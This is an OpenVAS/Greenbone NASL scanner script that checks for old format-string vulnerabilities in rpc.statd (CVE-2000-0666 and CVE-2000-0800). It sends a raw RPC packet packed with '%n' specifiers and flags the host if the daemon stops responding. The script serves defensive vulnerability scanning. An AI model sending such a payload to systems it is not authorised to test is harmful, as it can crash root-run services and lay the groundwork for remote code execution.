# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902725");
  script_version("2023-09-08T05:06:21+0000");
  script_tag(name:"last_modification", value:"2023-09-08 05:06:21 +0000 (Fri, 08 Sep 2023)");
  script_tag(name:"creation_date", value:"2011-09-09 17:36:48 +0200 (Fri, 09 Sep 2011)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2000-0666", "CVE-2000-0800");
  script_name("Nfs-utils rpc.statd Multiple Remote Format String Vulnerabilities");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_category(ACT_ATTACK);
  script_family("General");
  script_dependencies("gb_rpc_portmap_udp_detect.nasl");
  script_mandatory_keys("rpc/portmap/udp/detected");

  script_xref(name:"URL", value:"http://www.cert.org/advisories/CA-2000-17.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/1480");
  script_xref(name:"URL", value:"http://www.iss.net/security_center/reference/vuln/RPC_Statd_Format_Attack.htm");
  script_xref(name:"URL", value:"http://support.coresecurity.com/impact/exploits/191000d57f477b31f74df301b1d96722.html");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to execute arbitrary code with
  the privileges of the rpc.statd process, typically root.");

  script_tag(name:"insight", value:"The flaws are due to errors in rpc.statd/kstatd daemons logging
  system. A call to syslog in the program takes data directly from the remote
  user, this data could include printf-style format specifiers.");

  script_tag(name:"solution", value:"Upgrade to latest of nfs-utils version 0.1.9.1 or later.");

  script_tag(name:"summary", value:"The remote statd service is prone to multiple remote
  format string vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_probe");

  exit(0);
}

include("rpc.inc");
include("byte_func.inc");

RPC_PROG = "100024";

port = rpc_get_port( program:RPC_PROG, protocol:IPPROTO_UDP );
if( ! port ) exit( 0 );

req = raw_string( 0x78, 0xE0, 0x80, 0x4D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x02, 0x00, 0x01, 0x86, 0xB8, 0x00, 0x00, 0x00, 0x01,
                  0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
                  0x00, 0x20, 0x3A, 0x0B, 0xB6, 0xB8, 0x00, 0x00, 0x00, 0x09,
                  0x6C, 0x6F, 0x63, 0x61, 0x6C, 0x68, 0x6F, 0x73, 0x74, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x4E, 0x00, 0x00, 0x00 );

soc = open_sock_udp( port );
if( ! soc ) exit( 0 );

send( socket:soc, data:req );
res = recv( socket:soc, length:4096 );
if( isnull( res ) ) {
  close( soc );
  exit( 0 );
}

# rpc.statd is running. Construct the exploit containing '%n'
req = raw_string( 0x42, 0x99, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x02, 0x00, 0x01, 0x86, 0xB8, 0x00, 0x00,
                  0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
                  0x01, 0x00, 0x00, 0x00, 0x20, 0x3A, 0x0B, 0xB4, 0xB3,
                  0x00, 0x00, 0x00, 0x09, 0x6C, 0x6F, 0x63, 0x61, 0x6C,
                  0x68, 0x6F, 0x73, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x00, 0x28, 0x6E, 0x25, 0x6E, 0x25, 0x6E,
                  0x25, 0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25,
                  0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25, 0x6E,
                  0x25, 0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25,
                  0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25 );

send( socket:soc, data:req );
res = recv( socket:soc, length:1024 );

close( soc );

if( ! res ) {
  security_message( port:port, protocol:"udp" );
  exit( 0 );
}

exit( 99 );
